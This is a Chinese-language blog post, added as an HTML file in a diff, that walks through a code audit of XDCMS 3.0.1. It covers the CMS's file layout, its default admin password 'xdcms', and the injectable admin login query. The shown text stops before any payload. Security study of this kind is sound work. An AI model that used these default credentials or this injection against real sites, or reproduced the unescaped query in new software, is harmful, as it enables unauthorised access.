@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言开始框架审计了，太菜了，只能看着师傅们的文章跟着复现这样，第一个CMS就以XDCMS为切入点吧，听feng师傅说对新手挺友好的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XDCMS3.0.1">
+<meta property="og:url" content="http://example.com/2021/05/03/XDCMS3-0-1/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="前言开始框架审计了，太菜了，只能看着师傅们的文章跟着复现这样，第一个CMS就以XDCMS为切入点吧，听feng师傅说对新手挺友好的。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/05/03/HNIp4KYVM31QnWE.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/03/4BLVcbvZwf9OldS.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/03/rolNS8IVPBM7JDv.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/03/s9Qay8veLHdgn3N.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/03/HTDdl5cKMkBVSiq.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/03/Gt4xJnAjOQ3ciVY.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/03/zyMAsfQGP5Wqrwl.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/03/kBfvt3lUDHbo2Yq.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/03/cSyQiLlbV98M4oA.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/03/bxdeatyJImRBoGY.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/03/PtLC6saWMfx19Uz.png">
+<meta property="article:published_time" content="2021-05-03T02:11:45.000Z">
+<meta property="article:modified_time" content="2021-05-03T08:25:34.000Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/05/03/HNIp4KYVM31QnWE.png">
+
+
+<link rel="canonical" href="http://example.com/2021/05/03/XDCMS3-0-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/05/03/XDCMS3-0-1/","path":"2021/05/03/XDCMS3-0-1/","title":"XDCMS3.0.1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>XDCMS3.0.1 | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%A7%E8%87%B4%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">大致结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">1.2.1.</span> <span class="nav-text">后台弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%99%BB%E5%90%8E%E5%8F%B0"><span class="nav-number">1.2.2.</span> <span class="nav-text">SQL注入登后台</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E5%86%99shell"><span class="nav-number">1.2.3.</span> <span class="nav-text">后台写shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.2.4.</span> <span class="nav-text">后台文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E6%A1%86%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.5.</span> <span class="nav-text">注册框报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/03/XDCMS3-0-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="XDCMS3.0.1 | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XDCMS3.0.1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-05-03 10:11:45 / Modified: 16:25:34" itemprop="dateCreated datePublished" datetime="2021-05-03T10:11:45+08:00">2021-05-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始框架审计了，太菜了，只能看着师傅们的文章跟着复现这样，第一个CMS就以XDCMS为切入点吧，听feng师傅说对新手挺友好的。</p>
+<span id="more"></span>
+
+<p>先去网站上面下了它的源码，安装。</p>
+<h2 id="大致结构"><a href="#大致结构" class="headerlink" title="大致结构"></a>大致结构</h2><p>有以下几个目录：</p>
+<p><img src="https://i.loli.net/2021/05/03/HNIp4KYVM31QnWE.png" alt="123.png"></p>
+<p>因为目录下有 <code>index.php</code> 先看看主文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//中文</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;data/config.inc.php&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:install/index.php&quot;</span>);<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/system/common.inc.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>包含了一些文件，<code>data/config.inc.php</code> 内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//数据库配置信息</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>); <span class="comment">//数据库服务器主机地址</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>); <span class="comment">//数据库帐号</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PW&#x27;</span>, <span class="string">&#x27;root&#x27;</span>); <span class="comment">//数据库密码</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;xdcms&#x27;</span>); <span class="comment">//数据库名</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PRE&#x27;</span>, <span class="string">&#x27;c_&#x27;</span>); <span class="comment">//数据库表前缀</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>); <span class="comment">//数据库字符集</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PCONNECT&#x27;</span>, <span class="number">0</span>); <span class="comment">//0 或1，是否使用持久连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个文件记录了数据库的一些配置信息</p>
+<p><code>system/common.inc.php</code>  文件:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;IN_CMS&#x27;</span>,<span class="string">&#x27;true&#x27;</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/xdcms.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//系统目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SYS_DIR&#x27;</span>,<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;TP_DIR&#x27;</span>,<span class="string">&#x27;templates&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CMS_PATH&#x27;</span>,<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>),<span class="number">0</span>,-<span class="title function_ invoke__">strlen</span>(SYS_DIR)));</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SYS_PATH&#x27;</span>,CMS_PATH.SYS_DIR.<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATA_PATH&#x27;</span>,CMS_PATH.<span class="string">&#x27;data/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LIB_PATH&#x27;</span>,SYS_PATH.<span class="string">&#x27;libs/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MOD_PATH&#x27;</span>,SYS_PATH.<span class="string">&#x27;modules/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FUN_PATH&#x27;</span>,SYS_PATH.<span class="string">&#x27;function/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;TP_PATH&#x27;</span>,SYS_PATH.TP_DIR.<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//缓存目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CACHE_PATH&#x27;</span>,CMS_PATH.<span class="string">&#x27;cache/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CACHE_TP_PATH&#x27;</span>,CACHE_PATH.<span class="string">&#x27;cache_template/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CACHE_SYS_PATH&#x27;</span>,CACHE_PATH.<span class="string">&#x27;cache_sys/&#x27;</span>);</span><br><span class="line"><span class="comment">//附件目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;UPLOAD_PATH&#x27;</span>, CMS_PATH.<span class="string">&#x27;uploadfile/&#x27;</span>); <span class="comment">//附件保存物理路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Smarty配置</span></span><br><span class="line"><span class="keyword">include_once</span>(SYS_PATH.<span class="string">&quot;Smarty/Smarty.class.php&quot;</span>); <span class="comment">//包含smarty类文件</span></span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>(); <span class="comment">//建立smarty实例对象$smarty</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;caching=TP_CACHE; <span class="comment">//是否使用缓存</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;template_dir = TP_PATH; <span class="comment">//设置模板目录</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;compile_dir = SYS_PATH.<span class="string">&quot;templates_c&quot;</span>; <span class="comment">//设置编译目录</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;cache_dir = CACHE_TP_PATH; <span class="comment">//缓存文件夹</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;cache_lifetime = <span class="number">300</span>;  <span class="comment">//缓存时间</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;left_delimiter = <span class="string">&quot;&#123;&quot;</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;right_delimiter = <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(DATA_PATH.<span class="string">&quot;config.inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(FUN_PATH.<span class="string">&quot;fun.inc.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>定义了一些常量，然后包含了两个文件， 一个是 <code>config.inc.php</code> 之前那个数据库配置信息的，另外一个 <code>fun.inc.php</code> 则是主要的功能函数，并且 <code>func.inc.php</code>  里面包含了 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(FUN_PATH.<span class="string">&quot;clue.inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(LIB_PATH.<span class="string">&quot;base.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(LIB_PATH.<span class="string">&quot;Cookie.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(FUN_PATH.<span class="string">&quot;global.inc.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这四个文件，而<code>global.inc.php</code> ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//接收参数</span></span><br><span class="line"><span class="variable">$m</span>=<span class="title function_ invoke__">safe_replace</span>(<span class="title function_ invoke__">safe_html</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;m&quot;</span>]))) ? <span class="title function_ invoke__">safe_replace</span>(<span class="title function_ invoke__">safe_html</span>(<span class="variable">$_GET</span>[<span class="string">&quot;m&quot;</span>])) : <span class="string">&quot;content&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">safe_replace</span>(<span class="title function_ invoke__">safe_html</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;c&quot;</span>]))) ? <span class="title function_ invoke__">safe_replace</span>(<span class="title function_ invoke__">safe_html</span>(<span class="variable">$_GET</span>[<span class="string">&quot;c&quot;</span>])) : <span class="string">&quot;index&quot;</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">safe_replace</span>(<span class="title function_ invoke__">safe_html</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;f&quot;</span>]))) ? <span class="title function_ invoke__">safe_replace</span>(<span class="title function_ invoke__">safe_html</span>(<span class="variable">$_GET</span>[<span class="string">&quot;f&quot;</span>])) : <span class="string">&quot;init&quot;</span>;</span><br><span class="line"><span class="comment">//判断模块是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(MOD_PATH.<span class="variable">$m</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;module_not_exist&#x27;</span>),<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断类文件是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(MOD_PATH.<span class="variable">$m</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;class_not_exist&#x27;</span>),<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> MOD_PATH.<span class="variable">$m</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>;   <span class="comment">//调用类</span></span><br><span class="line">	</span><br><span class="line"><span class="comment">//判断类是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">class_exists</span>(<span class="variable">$c</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;class_not_exist&#x27;</span>),<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="keyword">new</span> <span class="variable">$c</span>();  <span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$p</span>-&gt;<span class="variable">$f</span>();   <span class="comment">//调用方法</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>主要接受传递的参数，然后调用相应的类和函数。</p>
+<p>大致一个流程就是这样。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="后台弱口令"><a href="#后台弱口令" class="headerlink" title="后台弱口令"></a>后台弱口令</h3><p>这里默认账号和密码都是<code>xdcms</code> ，如果对方没有改默认的，那么就可以默认后台登陆。</p>
+<h3 id="SQL注入登后台"><a href="#SQL注入登后台" class="headerlink" title="SQL注入登后台"></a>SQL注入登后台</h3><p>我们具体来看一下后台登陆的校验代码,check函数的关键部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="title function_ invoke__">safe_html</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">		<span class="variable">$password</span> = <span class="title function_ invoke__">safe_html</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">		<span class="variable">$verifycode</span> = <span class="title function_ invoke__">safe_html</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;verifycode&#x27;</span>]);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>)||<span class="keyword">empty</span>(<span class="variable">$password</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;user_pass_empty&#x27;</span>),<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$verifycode</span>!=<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;verifycode_error&#x27;</span>),<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from &quot;</span>.DB_PRE.<span class="string">&quot;admin where `username`=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;mysql-&gt;<span class="title function_ invoke__">num_rows</span>(<span class="variable">$sql</span>)==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;user_not_exist&#x27;</span>),<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$rs</span>=<span class="variable language_">$this</span>-&gt;mysql-&gt;<span class="title function_ invoke__">get_one</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="variable">$password</span>=<span class="title function_ invoke__">password</span>(<span class="variable">$password</span>,<span class="variable">$rs</span>[<span class="string">&#x27;encrypt&#x27;</span>]);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$password</span>!=<span class="variable">$rs</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">			<span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;password_error&#x27;</span>),<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$rs</span>[<span class="string">&#x27;is_lock&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;user_lock&#x27;</span>),<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
